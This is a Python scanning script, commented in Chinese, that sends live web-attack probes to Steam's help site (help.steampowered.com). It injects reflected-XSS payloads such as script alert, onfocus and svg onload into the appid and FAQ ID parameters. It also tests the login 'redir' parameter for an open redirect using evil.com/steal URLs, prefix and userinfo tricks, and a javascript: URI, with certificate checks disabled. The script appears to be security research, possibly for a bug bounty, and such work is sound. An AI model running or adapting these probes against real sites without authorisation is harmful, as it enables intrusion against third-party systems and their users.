# -*- coding: utf-8 -*-
"""help.steampowered.com help2 批次:参数反射测试
1. HelpWithGame?appid= 反射
2. faqs/view/:id 任意 ID 行为
3. wizard/Login?redir= open redirect
4. searchwords 搜索入口
"""
import re
import ssl
import http.cookiejar
import urllib.parse
import urllib.request

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
BASE = "https://help.steampowered.com"


def make_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=CTX),
        urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [('User-Agent', UA)]
    op.open(BASE + "/en/", timeout=15).read()
    sid = [c.value for c in cj if c.name == 'sessionid'][0]
    return op, sid


def req(op, url, method="GET", data=None, extra_headers=None):
    """返回 (status, body, headers_dict)"""
    headers = {'User-Agent': UA}
    if extra_headers:
        headers.update(extra_headers)
    r = urllib.request.Request(url, headers=headers, method=method, data=data)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode('utf-8', 'replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)


def find_reflections(body, payload, ctx=90):
    out = []
    for m in re.finditer(re.escape(payload), body):
        i = m.start()
        out.append(body[max(0, i - ctx):i + ctx].replace('\n', ' '))
    return out


def main():
    op, sid = make_opener()
    ck = f'sessionid={sid}'

    print("=" * 70)
    print("[1] HelpWithGame?appid= 反射测试")
    print("=" * 70)
    # 先看默认参数怎么用
    s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/?appid=570", extra_headers={'Cookie': ck})
    print(f"appid=570 -> {s} len={len(b)}")
    m = re.search(r'<title>([^<]*)</title>', b)
    print("  title:", m.group(1) if m else None)
    m = re.search(r'name="appid"[^>]*value="([^"]*)"', b)
    print("  appid input value:", m.group(1) if m else "(none)")
    payloads = ['570"><script>alert(1)</script>', '570" autofocus onfocus=alert(1) x="',
                'abc<svg/onload=alert(1)>', '999999999', '0']
    for p in payloads:
        s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/?appid=" + urllib.parse.quote(p),
                      extra_headers={'Cookie': ck})
        hits = find_reflections(b, p)
        print(f"appid={p!r} -> {s} 反射{len(hits)}处")
        for hh in hits[:2]:
            print("   @:", hh)
    # 看看页面里有哪些 appid 引用
    s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/?appid=570", extra_headers={'Cookie': ck})
    print("  页面内 appid 出现:")
    for m in set(re.findall(r'appid["=: ]+([^"\'&<>{}\s]+)', b)):
        print("   -", m[:60])

    print()
    print("=" * 70)
    print("[2] faqs/view/:id 任意 ID 行为")
    print("=" * 70)
    ids = [
        '10BB-D27A-6378-4436',   # 已知有效
        '0000-0000-0000-0000',
        'AAAA-AAAA-AAAA-AAAA',
        '10BB-D27A-6378-XXXX',
        '1',
        '10BB',
        '10BB-D27A-6378-4436"><script>alert(1)</script>',
        '10BB-D27A-6378-4436%27',
    ]
    for fid in ids:
        s, b, h = req(op, BASE + "/en/faqs/view/" + urllib.parse.quote(fid),
                      extra_headers={'Cookie': ck})
        title = re.search(r'<title>([^<]*)</title>', b)
        loc = h.get('Location')
        hits = find_reflections(b, fid[:40])
        print(f"{fid!r:45s} -> {s} loc={loc} title={title.group(1) if title else None!r} "
              f"反射{len(hits)}处")
        for hh in hits[:1]:
            print("   @:", hh[:160])

    print()
    print("=" * 70)
    print("[3] wizard/Login?redir= open redirect")
    print("=" * 70)
    redirs = [
        'https://evil.com/steal',          # 绝对外域
        '//evil.com/steal',                # 协议相对
        'https://evil.com@help.steampowered.com',  # userinfo 混淆
        'https://help.steampowered.com.evil.com',  # 前缀混淆
        'javascript:alert(1)',             # javascript 协议
        '/en/wizard/HelpWithAccount',      # 站内正常
        '%2F%2Fevil.com%2F',               # 双重编码
        'https://help.steampowered.com/en/wizard/ScamUserSearch/?text=1&appid=730',  # 自引用
    ]
    for rd in redirs:
        s, b, h = req(op, BASE + "/en/wizard/Login?redir=" + urllib.parse.quote(rd, safe=''),
                      extra_headers={'Cookie': ck})
        loc = h.get('Location')
        title = re.search(r'<title>([^<]*)</title>', b)
        # 页面中 redir 出现
        hits = find_reflections(b, 'redir')
        print(f"redir={rd!r:75s} -> {s} loc={loc} title={title.group(1) if title else None!r}")
        if loc:
            print("   Location:", loc)

    print()
    print("=" * 70)
    print("[4] searchwords 搜索入口 (HelpWithGame)")
    print("=" * 70)
    s, b, h = req(op, BASE + "/en/wizard/HelpWithGame/?appid=570", extra_headers={'Cookie': ck})
    m = re.search(r'<input[^>]*name="searchwords"[^>]*>', b)
    print("input 标签:", m.group(0) if m else None)
    m = re.search(r'<form[^>]*>', b)
    print("form:", m.group(0) if m else None)
    # 找 searchwords 附近 JS
    for m in re.finditer(r'searchwords', b):
        i = m.start()
        print("   ctx:", b[max(0, i - 100):i + 100].replace('\n', ' ')[:200])
    # 猜测搜索 URL: 常见 /en/search/?query= 或 /en/wizard/HelpWithGame/SearchGame/
    for url in [BASE + "/en/search/?query=csgo",
                BASE + "/en/wizard/HelpWithGame/SearchGame/?query=csgo",
                BASE + "/en/wizard/HelpWithGame/?searchwords=csgo&appid=570"]:
        s, b, h = req(op, url, extra_headers={'Cookie': ck})
        title = re.search(r'<title>([^<]*)</title>', b)
        print(f"{url.replace(BASE,'')} -> {s} len={len(b)} title={title.group(1) if title else None!r}")


if __name__ == '__main__':
    main()
